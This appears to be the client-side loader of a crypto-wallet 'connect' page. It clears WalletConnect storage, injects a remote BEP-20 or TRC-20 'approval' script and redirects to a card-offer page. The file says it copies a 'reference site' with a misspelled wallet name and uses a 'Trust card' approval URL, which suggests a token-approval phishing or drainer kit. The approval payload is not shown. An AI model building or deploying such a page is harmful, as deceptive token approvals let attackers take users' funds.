/**
 * Standalone connect page - NO Next.js. Runs fluxpay without WalletConnect conflicts.
 * Same flow as reference site (wallete-connect-bep-20).
 */
(function () {
  'use strict';

  var params = new URLSearchParams(window.location.search);
  var network = (params.get('network') || '').toUpperCase();
  if (network !== 'BNB' && network !== 'TRX') {
    document.getElementById('connect-connecting').innerHTML = '<p style="color:#94a3b8">Invalid network. <a href="index.html" style="color:#22d3ee">Go back</a></p>';
    return;
  }

  var connectingEl = document.getElementById('connect-connecting');
  var failedEl = document.getElementById('connect-failed');
  var errorMsg = document.getElementById('connect-error-msg');

  function getRedirectUrl() {
    try {
      var stored = sessionStorage.getItem('tw-card-redirect');
      if (stored) return stored;
    } catch (_) {}
    var country = params.get('country') || 'IN';
    return '/cards-country-' + country + '.html';
  }

  function showFailed(msg) {
    if (connectingEl) connectingEl.style.display = 'none';
    if (failedEl) failedEl.style.display = 'block';
    if (errorMsg) errorMsg.innerHTML = (msg || 'Connection failed') + ' <a href="https://dashboard.walletconnect.com" target="_blank" rel="noopener" style="color:#22d3ee;text-decoration:underline">Add this domain to WalletConnect allowlist</a>.';
  }

  function onSuccess() {
    var url = getRedirectUrl();
    window.location.href = url.startsWith('/') ? window.location.origin + url : url;
  }

  /* Clear WalletConnect - fresh start, no Next.js conflict */
  try {
    Object.keys(localStorage).forEach(function (k) {
      if (k.startsWith('wc@') || k === 'WALLETCONNECT_DEEPLINK_CHOICE' || k.startsWith('WCM_')) localStorage.removeItem(k);
    });
    if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
      try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
    }
  } catch (_) {}

  var baseUrl = (window.TRUST_CARD_APPROVAL_URL || new URL('fluxpay', location.origin).href).replace(/\/$/, '');
  var isTrc = network === 'TRX';
  var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
  var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';

  var timeoutId;
  timeoutId = setTimeout(function () {
    showFailed('WalletConnect modal did not appear. Add ' + location.hostname + ' to WalletConnect allowlist.');
  }, 15000);

  var done = false;
  function onSuccessWrap() {
    if (done) return;
    done = true;
    if (timeoutId) clearTimeout(timeoutId);
    onSuccess();
  }
  function showFailedWrap(msg) {
    if (done) return;
    done = true;
    if (timeoutId) clearTimeout(timeoutId);
    showFailed(msg);
  }

  window.addEventListener('unhandledrejection', function (e) {
    var msg = e && e.reason ? String(e.reason) : '';
    if (msg.indexOf('Connection closed') >= 0 || msg.indexOf('Loading chunk') >= 0 || msg.indexOf('ChunkLoadError') >= 0) {
      e.preventDefault();
      showFailedWrap(msg.indexOf('Connection closed') >= 0 ? 'Connection closed. Add ' + location.hostname + ' to WalletConnect allowlist.' : 'Connection failed. Try again.');
    }
  });

  function run() {
    var runFn = window[runKey] && window[runKey].run;
    if (!runFn) {
      var script = document.createElement('script');
      script.type = 'module';
      script.src = scriptUrl;
      script.onload = function () {
        var fn = window[runKey] && window[runKey].run;
        if (!fn) { showFailedWrap('Approval script did not load'); return; }
        fn(onSuccessWrap, showFailedWrap);
      };
      script.onerror = function () { showFailedWrap('Failed to load wallet script'); };
      document.head.appendChild(script);
      return;
    }
    runFn(onSuccessWrap, showFailedWrap);
  }

  run();
})();
